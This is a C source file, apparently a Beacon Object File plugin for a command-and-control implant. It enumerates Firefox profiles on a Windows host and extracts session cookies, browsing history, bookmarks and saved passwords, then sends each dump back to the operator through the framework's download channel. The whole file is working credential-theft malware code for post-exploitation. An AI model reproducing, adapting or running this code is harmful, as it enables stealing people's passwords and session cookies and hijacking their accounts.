#include "plg_common.h"

static int pjoin(char *o, size_t z, const char *a, const char *b) {
	int n = MSVCRT$_snprintf(o, z, "%s\\%s", a, b);
	return (n > 0 && (size_t)n < z) ? 0 : -1;
}

static void ff_out_name(char *dst, size_t dz, const char *prefix, const char *suffix) {
	if (prefix && prefix[0])
		MSVCRT$_snprintf(dst, dz, "%s_%s", prefix, suffix);
	else
		MSVCRT$_snprintf(dst, dz, "%s", suffix);
}

static void ff_table_to_file(const char *outname, const char *sqlite_path, const char *table,
	void (*emit)(formatp *f, PlgSqlite *db, int row)) {
	unsigned char *raw = NULL;
	DWORD rlen = 0;
	PlgSqlite *db;
	formatp fmt;
	int i, n, sz;
	char *data;
	if (plg_read_file_a(sqlite_path, &raw, &rlen) < 0)
		return;
	db = plg_sqlite_open(raw, rlen);
	plg_free(raw);
	if (!db)
		return;
	if (plg_sqlite_read_table(db, table) < 0) {
		plg_sqlite_close(db);
		return;
	}
	BeaconFormatAlloc(&fmt, 512 * 1024);
	n = plg_sqlite_row_count(db);
	for (i = 0; i < n; i++)
		emit(&fmt, db, i);
	data = BeaconFormatToString(&fmt, &sz);
	if (data && sz > 8)
		AxDownloadMemory((char *)outname, data, sz);
	BeaconFormatFree(&fmt);
	plg_sqlite_close(db);
}

static void emit_cookie(formatp *f, PlgSqlite *db, int row) {
	const char *h = plg_sqlite_get(db, row, "host");
	const char *n = plg_sqlite_get(db, row, "name");
	const char *v = plg_sqlite_get(db, row, "value");
	if (h && n && v)
		BeaconFormatPrintf(f, "[%s]\t{%s}={%s}\n", h, n, v);
}

static void emit_url(formatp *f, PlgSqlite *db, int row) {
	const char *u = plg_sqlite_get(db, row, "url");
	if (u)
		BeaconFormatPrintf(f, "%s\n", u);
}

#define MAX_FK 16384

static void ff_bookmarks_file(const char *outname, const char *places_path) {
	unsigned char *raw = NULL;
	DWORD rlen = 0;
	PlgSqlite *db;
	char fks[MAX_FK][24];
	int nf = 0, i, n, j, sz;
	formatp fmt;
	char *data;
	if (plg_read_file_a(places_path, &raw, &rlen) < 0)
		return;
	db = plg_sqlite_open(raw, rlen);
	plg_free(raw);
	if (!db)
		return;
	if (plg_sqlite_read_table(db, "moz_bookmarks") >= 0) {
		n = plg_sqlite_row_count(db);
		for (i = 0; i < n && nf < MAX_FK; i++) {
			const char *fk = plg_sqlite_get(db, i, "fk");
			if (fk && MSVCRT$strcmp(fk, "0") != 0) {
				MSVCRT$strncpy(fks[nf], fk, sizeof(fks[0]) - 1);
				fks[nf][sizeof(fks[0]) - 1] = 0;
				nf++;
			}
		}
	}
	if (plg_sqlite_read_table(db, "moz_places") < 0) {
		plg_sqlite_close(db);
		return;
	}
	BeaconFormatAlloc(&fmt, 256 * 1024);
	n = plg_sqlite_row_count(db);
	for (i = 0; i < n; i++) {
		const char *id = plg_sqlite_get(db, i, "id");
		const char *url = plg_sqlite_get(db, i, "url");
		if (!id || !url)
			continue;
		for (j = 0; j < nf; j++) {
			if (MSVCRT$strcmp(id, fks[j]) == 0) {
				BeaconFormatPrintf(&fmt, "%s\n", url);
				break;
			}
		}
	}
	data = BeaconFormatToString(&fmt, &sz);
	if (data && sz > 8)
		AxDownloadMemory((char *)outname, data, sz);
	BeaconFormatFree(&fmt);
	plg_sqlite_close(db);
}

void plg_process_firefox(const char *appdata, const char *file_prefix) {
	char profroot[PLG_MAX_PATH], search[PLG_MAX_PATH], pdir[PLG_MAX_PATH], sp[PLG_MAX_PATH], outn[220];
	char sfx[120];
	WIN32_FIND_DATAA fd;
	HANDLE h;
	if (pjoin(profroot, sizeof(profroot), appdata, "Mozilla\\Firefox\\Profiles") != 0)
		return;
	if (pjoin(search, sizeof(search), profroot, "*") != 0)
		return;
	h = KERNEL32$FindFirstFileA(search, &fd);
	if (h == INVALID_HANDLE_VALUE)
		return;
	do {
		if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			continue;
		if (fd.cFileName[0] == '.')
			continue;
		if (pjoin(pdir, sizeof(pdir), profroot, fd.cFileName) != 0)
			continue;
		MSVCRT$_snprintf(sfx, sizeof(sfx), "FireFox_%s_cookies.txt", fd.cFileName);
		ff_out_name(outn, sizeof(outn), file_prefix, sfx);
		if (pjoin(sp, sizeof(sp), pdir, "cookies.sqlite") == 0)
			ff_table_to_file(outn, sp, "moz_cookies", emit_cookie);
		MSVCRT$_snprintf(sfx, sizeof(sfx), "FireFox_%s_history.txt", fd.cFileName);
		ff_out_name(outn, sizeof(outn), file_prefix, sfx);
		if (pjoin(sp, sizeof(sp), pdir, "places.sqlite") == 0)
			ff_table_to_file(outn, sp, "moz_places", emit_url);
		MSVCRT$_snprintf(sfx, sizeof(sfx), "FireFox_%s_bookmarks.txt", fd.cFileName);
		ff_out_name(outn, sizeof(outn), file_prefix, sfx);
		if (pjoin(sp, sizeof(sp), pdir, "places.sqlite") == 0)
			ff_bookmarks_file(outn, sp);
		{
			formatp fpw;
			char *pwdata;
			int pwsz;
			BeaconFormatAlloc(&fpw, 768 * 1024);
			plg_ffox_dump_passwords(pdir, fd.cFileName, &fpw);
			pwdata = BeaconFormatToString(&fpw, &pwsz);
			if (pwdata && pwsz > 16) {
				MSVCRT$_snprintf(sfx, sizeof(sfx), "FireFox_%s_passwords.txt", fd.cFileName);
				ff_out_name(outn, sizeof(outn), file_prefix, sfx);
				AxDownloadMemory(outn, pwdata, pwsz);
			}
			BeaconFormatFree(&fpw);
		}
	} while (KERNEL32$FindNextFileA(h, &fd));
	KERNEL32$FindClose(h);
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Firefox: cookies/history/bookmarks/passwords（无主密码 key4+logins）");
}
